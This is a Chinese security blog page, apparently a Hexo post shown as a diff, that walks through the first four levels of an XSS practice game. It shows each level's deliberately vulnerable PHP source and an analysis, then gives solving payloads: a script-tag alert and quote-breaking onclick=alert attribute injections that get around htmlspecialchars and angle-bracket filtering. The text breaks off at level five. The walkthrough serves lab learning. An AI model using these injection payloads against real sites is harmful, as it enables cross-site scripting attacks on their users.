@@ -1,0 +1,1978 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="xss小游戏源码分析, HTML,CSS,JavaScript,php,python,linux,mysql等">
+    <meta name="description" content="专注web，分享生活，分享知识">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>xss小游戏源码分析 | Script kiddie&#39;s life</title>
+    <link rel="icon" type="image/jpeg" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/favicon.jpg">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/css/my.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/jquery/jquery.min.js"></script>
+    
+<style type="text/css" lang="css">
+    #loading-container{
+        position: fixed;
+        top: 0;
+        left: 0;
+        min-height: 100vh;
+        width: 100vw;
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background: #FFF;
+        text-align: center;
+        /* loader页面消失采用渐隐的方式*/
+        -webkit-transition: opacity 1s ease;
+        -moz-transition: opacity 1s ease;
+        -o-transition: opacity 1s ease;
+        transition: opacity 1s ease;
+    }
+    .loading-image{
+        width: 120px;
+        height: 50px;
+        transform: translate(-50%);
+    }
+
+    .loading-image div:nth-child(2) {
+        -webkit-animation: pacman-balls 1s linear 0s infinite;
+        animation: pacman-balls 1s linear 0s infinite
+    }
+
+    .loading-image div:nth-child(3) {
+        -webkit-animation: pacman-balls 1s linear .33s infinite;
+        animation: pacman-balls 1s linear .33s infinite
+    }
+
+    .loading-image div:nth-child(4) {
+        -webkit-animation: pacman-balls 1s linear .66s infinite;
+        animation: pacman-balls 1s linear .66s infinite
+    }
+
+    .loading-image div:nth-child(5) {
+        -webkit-animation: pacman-balls 1s linear .99s infinite;
+        animation: pacman-balls 1s linear .99s infinite
+    }
+
+   .loading-image div:first-of-type {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
+        animation: rotate_pacman_half_up .5s 0s infinite;
+    }
+    .loading-image div:nth-child(2) {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
+        animation: rotate_pacman_half_down .5s 0s infinite;
+        margin-top: -50px;
+    }
+    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+
+    .loading-image div:nth-child(3),
+    .loading-image div:nth-child(4),
+    .loading-image div:nth-child(5),
+    .loading-image div:nth-child(6){
+        background-color: #49b1f5;
+        width: 15px;
+        height: 15px;
+        border-radius: 100%;
+        margin: 2px;
+        width: 10px;
+        height: 10px;
+        position: absolute;
+        transform: translateY(-6.25px);
+        top: 25px;
+        left: 100px;
+    }
+    .loading-text{
+        margin-bottom: 20vh;
+        text-align: center;
+        color: #2c3e50;
+        font-size: 2rem;
+        box-sizing: border-box;
+        padding: 0 10px;
+        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    @media only screen and (max-width: 500px) {
+         .loading-text{
+            font-size: 1.5rem;
+         }
+    }
+    .fadeout {
+        opacity: 0;
+        filter: alpha(opacity=0);
+    }
+    /* logo出现动画 */
+    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
+    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
+ </style>
+ <script>
+(function () {
+    const loaded = function(){
+       setTimeout(function(){
+            const loader = document.getElementById("loading-container");
+            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
+            // document.getElementById("body-wrap").style.display="flex";
+            setTimeout(function(){
+                loader.style.display="none";
+            },1000); 
+        },1000);//强制显示loading page 1s  
+    };
+    loaded();
+})()
+ </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Script kiddie's life" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><style type="text/css" lang="css">
+    #loading-container{
+        position: fixed;
+        top: 0;
+        left: 0;
+        min-height: 100vh;
+        width: 100vw;
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background: #FFF;
+        text-align: center;
+        /* loader页面消失采用渐隐的方式*/
+        -webkit-transition: opacity 1s ease;
+        -moz-transition: opacity 1s ease;
+        -o-transition: opacity 1s ease;
+        transition: opacity 1s ease;
+    }
+    .loading-image{
+        width: 120px;
+        height: 50px;
+        transform: translate(-50%);
+    }
+
+    .loading-image div:nth-child(2) {
+        -webkit-animation: pacman-balls 1s linear 0s infinite;
+        animation: pacman-balls 1s linear 0s infinite
+    }
+
+    .loading-image div:nth-child(3) {
+        -webkit-animation: pacman-balls 1s linear .33s infinite;
+        animation: pacman-balls 1s linear .33s infinite
+    }
+
+    .loading-image div:nth-child(4) {
+        -webkit-animation: pacman-balls 1s linear .66s infinite;
+        animation: pacman-balls 1s linear .66s infinite
+    }
+
+    .loading-image div:nth-child(5) {
+        -webkit-animation: pacman-balls 1s linear .99s infinite;
+        animation: pacman-balls 1s linear .99s infinite
+    }
+
+   .loading-image div:first-of-type {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
+        animation: rotate_pacman_half_up .5s 0s infinite;
+    }
+    .loading-image div:nth-child(2) {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
+        animation: rotate_pacman_half_down .5s 0s infinite;
+        margin-top: -50px;
+    }
+    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+
+    .loading-image div:nth-child(3),
+    .loading-image div:nth-child(4),
+    .loading-image div:nth-child(5),
+    .loading-image div:nth-child(6){
+        background-color: #49b1f5;
+        width: 15px;
+        height: 15px;
+        border-radius: 100%;
+        margin: 2px;
+        width: 10px;
+        height: 10px;
+        position: absolute;
+        transform: translateY(-6.25px);
+        top: 25px;
+        left: 100px;
+    }
+    .loading-text{
+        margin-bottom: 20vh;
+        text-align: center;
+        color: #2c3e50;
+        font-size: 2rem;
+        box-sizing: border-box;
+        padding: 0 10px;
+        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    @media only screen and (max-width: 500px) {
+         .loading-text{
+            font-size: 1.5rem;
+         }
+    }
+    .fadeout {
+        opacity: 0;
+        filter: alpha(opacity=0);
+    }
+    /* logo出现动画 */
+    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
+    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
+ </style>
+ <script>
+(function () {
+    const loaded = function(){
+       setTimeout(function(){
+            const loader = document.getElementById("loading-container");
+            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
+            // document.getElementById("body-wrap").style.display="flex";
+            setTimeout(function(){
+                loader.style.display="none";
+            },1000); 
+        },1000);//强制显示loading page 1s  
+    };
+    loaded();
+})()
+ </script></head>
+
+
+
+ <div id="loading-container">
+     <p class="loading-text">玩命加载中 . . . </p> 
+     <div class="loading-image">
+         <div></div>
+         <div></div>
+         <div></div>
+         <div></div> 
+         <div></div>
+     </div>
+ </div><body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/logo.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Script kiddie's life</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>文章分类</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/web%E5%AE%89%E5%85%A8">
+          
+          <span>web安全</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F">
+          
+          <span>内网渗透</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/CTF">
+          
+          <span>CTF</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/python">
+          
+          <span>python</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/linux">
+          
+          <span>linux</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8">
+          
+          <span>无线安全</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-bicycle" style="zoom: 0.6;"></i>
+      
+      <span>各种折腾</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/%E5%8D%9A%E5%AE%A2">
+          
+          <span>博客</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/qq%E6%9C%BA%E5%99%A8%E4%BA%BA">
+          
+          <span>qq机器人</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-sitemap" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>文章标签</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>时间轴</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-envelope" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/logo.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Script kiddie's life</div>
+        <div class="logo-desc">
+            
+            专注web，分享生活，分享知识
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-bookmark"></i>
+			
+			文章分类
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/web%E5%AE%89%E5%85%A8 " style="margin-left:75px";>
+				  
+		          <span>web安全</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F " style="margin-left:75px";>
+				  
+		          <span>内网渗透</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/CTF " style="margin-left:75px";>
+				  
+		          <span>CTF</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/python " style="margin-left:75px";>
+				  
+		          <span>python</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/linux " style="margin-left:75px";>
+				  
+		          <span>linux</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8 " style="margin-left:75px";>
+				  
+		          <span>无线安全</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-bicycle"></i>
+			
+			各种折腾
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/%E5%8D%9A%E5%AE%A2 " style="margin-left:75px";>
+				  
+		          <span>博客</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/qq%E6%9C%BA%E5%99%A8%E4%BA%BA " style="margin-left:75px";>
+				  
+		          <span>qq机器人</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-sitemap"></i>
+			
+			归档
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/tags " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>文章标签</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/archives " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>时间轴</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-envelope"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/featureimages/1.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">xss小游戏源码分析</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/xss/">
+                                <span class="chip bg-color">xss</span>
+                            </a>
+                        
+                            <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                <span class="chip bg-color">靶场</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-07-16
+                </div>
+                
+
+                
+
+                
+
+                
+
+                 <span id="busuanzi_container_site_pv" style='display:none'></span> <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp; <span id="busuanzi_value_page_pv" ></span> 
+
+            </div>
+
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>下载地址:<a href="https://files.cnblogs.com/files/Lmg66/xssgame-master.zip" target="_blank" rel="noopener">https://files.cnblogs.com/files/Lmg66/xssgame-master.zip</a><br>使用:下载解压，放到www目录下(phpstudy)，http服务下都行，我使用的是phpstudy</p>
+<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+window.location.href=&quot;level2.php?keyword=跨站师&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第1关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第1关 先热个身吧&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;name&quot;];
+echo &quot;&lt;h2 align=center&gt;欢迎用户:&quot;.$str.&quot;&lt;/h2&gt;&quot;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/8deed969-b339-4c84-8654-b1a1e40e06de.png&quot; width=&quot;50%&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><p>对name没有任何的过滤输出到标签中,基本的xss都行</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre><code>level1.php?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><h3 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level3.php?writing=苦尽甘来&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第2关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第2关 窒息的操作&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
+&lt;form action=level2.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;
+&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#39;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/688da926-8a0b-452a-9a2b-82ba919328fb.jpg&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h3><p>用htmlspecialchars()函数，之前做过，会html实体化，&lt;&gt;会被转义<br>可以尝试”来闭合”</p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; onclick=alert(&#39;XSS&#39;) //
+&quot; onclick=alert(&#39;XSS&#39;) &quot;</code></pre><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><h3 id="查看源码-2"><a href="#查看源码-2" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level4.php?keyword=宁静致远&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第3关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第3关 这该咋办啊&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
+&lt;form action=level3.php method=GET&gt;
+&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&quot;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/ee7a688a-d75e-4ed7-8a79-96e62d3127e2.png&quot; width=&quot;15%&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析:"></a>分析:</h3><p>和第二关类似，只是变成了单引号，闭合单引号即可</p>
+<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&#39; onclick=alert(&#39;xss&#39;) &#39;
+&#39; onclick=alert(&#39;xs&#39;) //</code></pre><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><h3 id="查看源码-3"><a href="#查看源码-3" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level5.php?keyword=逆水行舟&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第4关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第4关 生无可恋&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
+&lt;form action=level4.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#39;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/0d3f0d24-a861-4d20-97da-f807ea842be8.jpg&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析:"></a>分析:</h3><p>在第二关的基础上进行了&lt; &gt;的过滤，但第二关payload没有 &lt; &gt;仍然可以使用</p>
+<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; onclick=alert(&#39;XSS&#39;) //
+&quot; onclick=alert(&#39;XSS&#39;) &quot;</code></pre><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><h3 id="查看源码-4"><a href="#查看源码-4" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
